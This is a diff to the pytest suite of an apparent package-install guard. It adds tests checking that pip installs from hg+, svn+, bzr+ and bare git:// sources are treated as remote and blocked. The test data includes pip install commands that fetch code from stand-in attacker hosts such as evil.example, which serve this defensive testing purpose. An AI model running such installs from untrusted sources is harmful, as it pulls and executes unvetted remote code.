@@ -23,6 +23,7 @@ from package_doctor.guard import (
     UNCHECKED,
     WARN,
     decide,
+    is_remote_install_target,
     near_miss,
     one_edit_apart,
     parse_install_command,
@@ -103,6 +104,10 @@ def test_near_miss_checks_short_names_for_same_length_edits_only():
     ("pip install -r requirements.txt", [], []),
     ("pip install requests", ["requests"], []),
     ("pytest -q", [], []),
+    ("pip install hg+https://bitbucket.org/evil/pkg", [], ["hg+https://bitbucket.org/evil/pkg"]),
+    ("pip install svn+https://evil.example/repo", [], ["svn+https://evil.example/repo"]),
+    ("pip install git://evil.example/repo.git", [], ["git://evil.example/repo.git"]),
+    ("pip install bzr+lp:evil-pkg", [], ["bzr+lp:evil-pkg"]),
 ])
 def test_urls_paths_and_vcs_targets_are_surfaced_rather_than_dropped(command, names, unresolvable):
     """`parse_install_command` skips what no registry can check. Those
@@ -110,6 +115,29 @@ def test_urls_paths_and_vcs_targets_are_surfaced_rather_than_dropped(command, na
     must come back somewhere a caller can act on them."""
     assert parse_install_command(command) == names
     assert unresolvable_install_targets(command) == unresolvable
+
+
+@pytest.mark.parametrize("target, expected", [
+    ("https://evil.example/pkg.whl", True),
+    ("http://evil.example/pkg.whl", True),
+    ("git+https://github.com/x/y", True),
+    ("ssh://git@host/x.git", True),
+    ("git://evil.example/repo.git", True),
+    ("hg+https://bitbucket.org/evil/pkg", True),
+    ("svn+https://evil.example/repo", True),
+    ("bzr+https://evil.example/repo", True),
+    ("bzr+lp:evil-pkg", True),
+    ("./vendor/thing", False),
+    ("requirements.txt", False),
+    ("requests", False),
+    ("file:///tmp/thing.whl", False),
+])
+def test_is_remote_install_target_classifies_vcs_schemes(target, expected):
+    """Every scheme pip fetches over the network must be recognised as
+    remote, not just the four `https`/`http`/`git+`/`ssh` prefixes the first
+    fix covered - `hg+`, `bzr+`, `svn+`, and bare `git://` are equally a
+    network fetch and equally unresolvable by a registry lookup."""
+    assert is_remote_install_target(target) is expected
 
 
 @pytest.mark.parametrize("command, expected", [
@@ -407,6 +435,32 @@ def test_hook_blocks_a_url_install_without_a_lookup(monkeypatch, capsys):
     out, err = capsys.readouterr()
     assert code == 2
     assert "https://evil.example/pkg.whl" in err and "URL or VCS" in err
+    assert not called and out == ""
+
+
+@pytest.mark.parametrize("command", [
+    "pip install hg+https://bitbucket.org/evil/pkg",
+    "pip install svn+https://evil.example/repo",
+    "pip install git://evil.example/repo.git",
+    "pip install bzr+lp:evil-pkg",
+])
+def test_hook_blocks_other_vcs_schemes_without_a_lookup(monkeypatch, capsys, command):
+    """These schemes used to fall through both `parse_install_command` (not
+    a valid PyPI requirement string) and the hook's own remote-target filter
+    (narrower than `_looks_local`), so the hook exited 0 with no output at
+    all - the exact "highest-risk install, silently allowed" failure mode
+    the URL fix above addressed, just for the schemes it didn't enumerate."""
+    called = []
+
+    class Stub:
+        def __init__(self, *a, **kw):
+            called.append(1)
+
+    monkeypatch.setattr(cli, "Analyzer", Stub)
+    code = run_hook(monkeypatch, hook_event(command))
+    out, err = capsys.readouterr()
+    assert code == 2
+    assert "URL or VCS" in err
     assert not called and out == ""
 
 
